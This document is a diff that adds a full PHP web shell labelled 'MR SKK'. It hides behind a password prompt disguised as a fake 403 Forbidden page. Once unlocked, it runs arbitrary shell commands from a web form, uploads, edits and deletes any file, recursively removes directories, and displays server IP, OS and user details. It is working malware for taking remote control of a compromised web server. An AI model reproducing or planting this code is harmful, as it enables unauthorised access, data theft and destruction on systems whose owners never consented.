@@ -1,0 +1,344 @@
+<?php
+$password = "shell-grup-mr-skk"; // password
+session_start();
+error_reporting(0);
+set_time_limit(0);
+ini_set("memory_limit",-1);
+$sessioncode = md5(__FILE__);
+
+if (!empty($password) && $_SESSION[$sessioncode] != $password) {
+    if (isset($_REQUEST['pass']) && $_REQUEST['pass'] == $password) {
+        $_SESSION[$sessioncode] = $password;
+    } else {
+        header('HTTP/1.0 403 Forbidden');
+        echo "<html><head>
+        <title>403 Forbidden</title>
+        <style>
+            body {
+                background: url('https://cdn.pixabay.com/animation/2023/08/17/11/08/11-08-28-391_512.gif') no-repeat center center fixed;
+                background-size: cover; 
+                color: red;
+                font-family: Arial, sans-serif;
+                text-align: center;
+                margin-top: 20%;
+            }
+            .blood-splatter {
+                font-size: 48px;
+                font-weight: bold;
+                text-shadow: 2px 2px 4px black;
+                color: gold; /* Warna cerah emas */
+            }
+            .garuda {
+                width: 200px; 
+                height: auto;
+                margin-top: 50px;
+            }
+            input[type='password'] {
+                padding: 10px;
+                border-radius: 5px;
+                border: 1px solid red;
+                margin-top: 20px;
+                color: black;
+            }
+            input[type='submit'] {
+                padding: 10px 15px;
+                border-radius: 5px;
+                background: red;
+                color: white;
+                border: none;
+                cursor: pointer;
+                margin-top: 10px;
+            }
+        </style>
+        </head><body>";
+        
+        // Tambah elemen audio dengan autoplay
+        echo "<audio autoplay loop>
+                <source src='https://res.cloudinary.com/di1pwoapk/video/upload/v1740429856/media_sepuh_dmvqf5.mp3' type='audio/mpeg'>
+                Your browser does not support the audio tag.
+              </audio>";
+
+        echo "<div class='blood-splatter'>KAMI AKAN BERHENTI JIKA UMR 1000$</div>";
+        echo "<img src='https://res.cloudinary.com/di1pwoapk/image/upload/w_1000,ar_16:9,c_fill,g_auto,e_sharpen/v1737373130/skk1x1clear_s4e9a7.png' alt='Garuda' class='garuda'>";
+        echo "<form method='post'>
+                <input type='password' name='pass' placeholder='Masukkan Sandi' required>
+                <input type='submit' value='LOGIN BOSS'>
+              </form>";
+        echo "</body></html>";
+        exit;        
+    }
+}
+?>
+
+
+<?php
+session_start();
+
+// Enable error reporting
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Fungsi pikeun ngahapus directory sacara rekursif
+function deleteDir($dir) {
+    if (!is_dir($dir)) {
+        return unlink($dir);
+    }
+    foreach (scandir($dir) as $item) {
+        if ($item == '.' || $item == '..') continue;
+        if (!deleteDir($dir . DIRECTORY_SEPARATOR . $item)) {
+            return false;
+        }
+    }
+    return rmdir($dir);
+}
+
+// Get system information
+$server_ip    = $_SERVER['SERVER_ADDR'];
+$web_server   = $_SERVER['SERVER_SOFTWARE'];
+$system       = php_uname();
+$user         = get_current_user();
+$mysql_status = function_exists('mysqli_connect') ? 'Enabled' : 'Disabled';
+
+// Tentukan directory ayeuna
+$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
+if ($dir === false || !is_dir($dir)) {
+    $dir = getcwd();
+}
+$parentDir = dirname($dir);
+
+// Handle file upload
+if (isset($_FILES['file'])) {
+    $targetFile = $dir . '/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
+        echo "<p style='color:lime;'>File uploaded successfully!</p>";
+    } else {
+        echo "<p style='color:red;'>Failed to upload file.</p>";
+    }
+}
+
+// Create Directory Feature
+if (isset($_POST['create_dir'])) {
+    $newDir = $dir . '/' . $_POST['dirname'];
+    if (!is_dir($newDir)) {
+        mkdir($newDir, 0777, true);
+        echo "<p style='color:lime;'>Directory created successfully!</p>";
+    } else {
+        echo "<p style='color:red;'>Directory already exists.</p>";
+    }
+}
+
+// Create File Feature
+if (isset($_POST['create_file'])) {
+    $newFile = $dir . '/' . $_POST['filename'];
+    if (!file_exists($newFile)) {
+        file_put_contents($newFile, '');
+        echo "<p style='color:lime;'>File created successfully!</p>";
+    } else {
+        echo "<p style='color:red;'>File already exists.</p>";
+    }
+}
+
+// Delete Feature (for both file and directory)
+if (isset($_GET['delete'])) {
+    $target = realpath($_GET['delete']);
+    if (file_exists($target)) {
+        if (is_file($target)) {
+            unlink($target);
+            echo "<p style='color:lime;'>File deleted successfully!</p>";
+        } elseif (is_dir($target)) {
+            if (deleteDir($target)) {
+                echo "<p style='color:lime;'>Directory deleted successfully!</p>";
+            } else {
+                echo "<p style='color:red;'>Failed to delete directory.</p>";
+            }
+        }
+    } else {
+        echo "<p style='color:red;'>Target does not exist.</p>";
+    }
+}
+
+// Edit File Feature
+if (isset($_POST['save_file'])) {
+    $fileToEdit = $_POST['file_path'];
+    file_put_contents($fileToEdit, $_POST['file_content']);
+    echo "<p style='color:lime;'>File saved successfully!</p>";
+}
+if (isset($_GET['edit'])) {
+    $fileToEdit = realpath($_GET['edit']);
+    if (file_exists($fileToEdit) && is_file($fileToEdit)) {
+        $content = htmlspecialchars(file_get_contents($fileToEdit));
+        echo "<div class='container'>
+            <h2>Edit File: " . htmlspecialchars($fileToEdit) . "</h2>
+            <form action='' method='POST'>
+                <textarea name='file_content' rows='10' style='width:100%; box-sizing: border-box;'>$content</textarea>
+                <input type='hidden' name='file_path' value='" . htmlspecialchars($fileToEdit) . "'>
+                <br>
+                <input type='submit' name='save_file' value='Save File'>
+            </form>
+            <br>
+            <a href='?dir=" . urlencode(dirname($fileToEdit)) . "' style='color:orange;'>← Back to Listing</a>
+        </div>";
+    }
+    exit;
+}
+
+// Command Terminal Feature
+if (isset($_POST['cmd'])) {
+    $command = $_POST['cmd'];
+    // Set the current directory to the selected one
+    chdir($dir); 
+    $output  = shell_exec($command . " 2>&1");
+    echo "<div class='container'>
+        <h2>Command Output</h2>
+        <pre style='text-align:left; background:#000; padding:10px; border-radius:5px;'>" . htmlspecialchars($output) . "</pre>
+        <br>
+        <a href='?dir=" . urlencode($dir) . "' style='color:orange;'>← Back to Listing</a>
+    </div>";
+}
+
+echo "<html><head><title>MR SKK</title>
+<style>
+body {
+    background: url('https://res.cloudinary.com/di1pwoapk/image/upload/v1739992748/9070090_lbdph7.jpg') no-repeat center center fixed;
+    background-size: cover;
+    color: white;
+    font-family: Arial, sans-serif;
+}
+.container {
+    width: 90%;
+    max-width: 800px;
+    margin: auto;
+    padding: 20px;
+    background: rgba(0, 0, 0, 0.8);
+    border-radius: 10px;
+    text-align: center;
+}
+.table {
+    width: 100%;
+    border-collapse: collapse;
+    background: black;
+}
+th, td {
+    padding: 10px;
+    text-align: left;
+    border: 1px solid white;
+}
+th {
+    background: #444;
+}
+.home-button {
+    background: red;
+    color: white;
+    padding: 10px 15px;
+    text-decoration: none;
+    border-radius: 5px;
+    display: inline-block;
+    margin-bottom: 10px;
+}
+.cmd-form input[type='text'] {
+    width: 80%;
+    padding: 8px;
+    border: none;
+    border-radius: 5px;
+    margin-bottom: 10px;
+}
+.cmd-form input[type='submit'] {
+    padding: 8px 15px;
+    border: none;
+    border-radius: 5px;
+    background: green;
+    color: white;
+}
+.footer {
+    margin-top: 20px;
+    font-size: 0.9em;
+    text-align: center;
+}
+.file {
+    color: #FF1493; /* Warna cerah pikeun file */
+    font-weight: bold;
+}
+.dir {
+    color: #00BFFF; /* Warna cerah pikeun direktori */
+    font-weight: bold;
+}
+.rainbow {
+    background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+</style></head><body>";
+
+echo "<div class='container'>
+    <h2>MR SKK</h2>
+    <p><b>Server IP:</b> $server_ip</p>
+    <p><b>Web Server:</b> $web_server</p>
+    <p><b>System:</b> $system</p>
+    <p><b>User:</b> $user</p>
+    <p><b>MySQL:</b> $mysql_status</p>
+    <p><b>Directory:</b> " . htmlspecialchars($dir) . "</p>
+    <a href='?dir=" . urlencode($parentDir) . "'>🔙 Go Back</a>
+    <a href='?dir=' class='home-button'>🏠 Home</a>
+</div>";
+
+echo "<div class='container'>
+    <form action='' method='POST' enctype='multipart/form-data'>
+        <input type='file' name='file' required>
+        <input type='submit' value='Upload'>
+    </form>
+    <form action='' method='POST'>
+        <input type='text' name='dirname' placeholder='Directory Name' required>
+        <input type='submit' name='create_dir' value='Create Directory'>
+    </form>
+    <form action='' method='POST'>
+        <input type='text' name='filename' placeholder='File Name' required>
+        <input type='submit' name='create_file' value='Create File'>
+    </form>
+</div>";
+
+// Command Terminal Form
+echo "<div class='container cmd-form'>
+    <h2>Command Terminal</h2>
+    <form action='' method='POST'>
+        <input type='text' name='cmd' placeholder='Enter command...'>
+        <input type='submit' value='Run'>
+    </form>
+</div>";
+
+// List Directory Contents
+if (is_dir($dir)) {
+    echo "<div class='container'>";
+    echo "<table class='table'>
+    <tr>
+        <th>Name</th>
+        <th>Size</th>
+        <th>Last Modified</th>
+        <th>Owner/Group</th>
+        <th>Permissions</th>
+        <th>Actions</th>
+    </tr>";
+    foreach (scandir($dir) as $item) {
+        if ($item !== '.' && $item !== '..') {
+            $path = $dir . '/' . $item;
+            $isDir = is_dir($path);
+            $ownerInfo = posix_getpwuid(fileowner($path));
+            $owner = $ownerInfo ? $ownerInfo['name'] : 'N/A';
+            $group = $ownerInfo ? $ownerInfo['name'] : 'N/A';
+            $permissions = substr(sprintf('%o', fileperms($path)), -4);
+            $colorClass = $isDir ? 'dir' : 'file'; // Class for CSS styling
+            echo "<tr>
+                <td class='$colorClass'><a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($item) . "</a></td>
+                <td>" . ($isDir ? '-' : filesize($path) . ' bytes') . "</td>
+                <td>" . date("Y-m-d H:i:s", filemtime($path)) . "</td>
+                <td>$owner/$group</td>
+                <td>$permissions</td>
+                <td><a href='?delete=" . urlencode($path) . "' style='color:red;'>Delete</a> | <a href='?edit=" . urlencode($path) . "' style='color:blue;'>Edit</a></td>
+            </tr>";
+        }
+    }
+    echo "</table></div>";
+}
+
+echo "<div class='footer'>Powered by MR SKK</div>";
+echo "</body></html>";
+?>
